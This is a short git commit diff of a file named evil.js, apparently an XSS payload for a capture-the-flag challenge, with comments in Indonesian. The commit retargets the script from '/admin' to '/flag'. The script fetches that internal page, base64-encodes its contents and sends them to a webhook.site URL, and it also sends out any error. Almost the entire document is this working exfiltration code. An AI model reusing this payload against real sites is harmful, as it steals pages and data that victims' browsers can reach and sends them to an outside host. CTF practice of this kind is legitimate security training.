15bf1b7d7915689386ec166cf81a66ef71e65805
Heru Kristanto <99137032+NicoIzumi30@users.noreply.github.com>
2025-08-30 11:59:53 +0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -6,7 +6,7 @@ try {
 } catch(e) {}
 
 // --- opsi utama: scrap halaman internal yang memuat flag
-fetch('/admin')       // ganti ke '/flag' atau '/' kalau perlu
+fetch('/flag')       // ganti ke '/flag' atau '/' kalau perlu
   .then(r => r.text())
   .then(t => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t)))
   .catch(err => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(err)));
